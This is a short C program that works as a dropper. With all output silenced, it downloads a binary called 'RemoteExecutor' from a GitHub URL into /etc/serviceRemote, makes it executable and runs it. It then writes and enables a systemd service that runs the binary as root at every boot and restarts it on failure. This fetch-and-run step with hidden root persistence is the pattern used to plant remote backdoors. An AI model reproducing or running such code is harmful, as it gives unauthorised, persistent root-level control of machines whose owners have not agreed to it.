#include <stdio.h>
#include <stdlib.h>

#define DOWNLOAD_URL "https://github.com/Colgate13/RemoteExecutor/raw/main/bin/main"
#define TARGET_PATH "/etc/serviceRemote/serviceRemote"
#define SERVICE_NAME "serviceRemote"

int main()
{
  // Download and move the binary to the target path
  system("mkdir -p /etc/serviceRemote >> /dev/null 2>&1");
  system("wget -O /etc/serviceRemote/serviceRemote " DOWNLOAD_URL " >> /dev/null 2>&1");
  system("chmod +x /etc/serviceRemote/serviceRemote >> /dev/null 2>&1");
  system("/etc/serviceRemote/serviceRemote /dev/null 2>&1");

  // Create a service to run the binary
  FILE *serviceFile = fopen("/etc/systemd/system/" SERVICE_NAME ".service", "w");
  if (serviceFile == NULL)
  {
    printf("Error creating service file\n");
    return 1;
  }

  /*
    [Unit]
    Description=Remote Executor
    After=network.target

    [Service]
    ExecStart=/etc/serviceRemote/serviceRemote
    Restart=on-failure
    User=root

    [Install]
    WantedBy=multi-user.target
  */
  fprintf(serviceFile, "[Unit]\n");
  fprintf(serviceFile, "Description=Remote Executor\n");
  fprintf(serviceFile, "After=network.target\n");
  fprintf(serviceFile, "\n");
  fprintf(serviceFile, "[Service]\n");
  fprintf(serviceFile, "ExecStart=" TARGET_PATH "\n");
  fprintf(serviceFile, "Restart=on-failure\n");
  fprintf(serviceFile, "User=root\n");
  fprintf(serviceFile, "\n");
  fprintf(serviceFile, "[Install]\n");
  fprintf(serviceFile, "WantedBy=multi-user.target\n");
  fclose(serviceFile);

  // Enable and start the service
  system("systemctl enable " SERVICE_NAME ".service >> /dev/null 2>&1");
  system("systemctl start " SERVICE_NAME ".service >> /dev/null 2>&1");
  
  return 0;
}
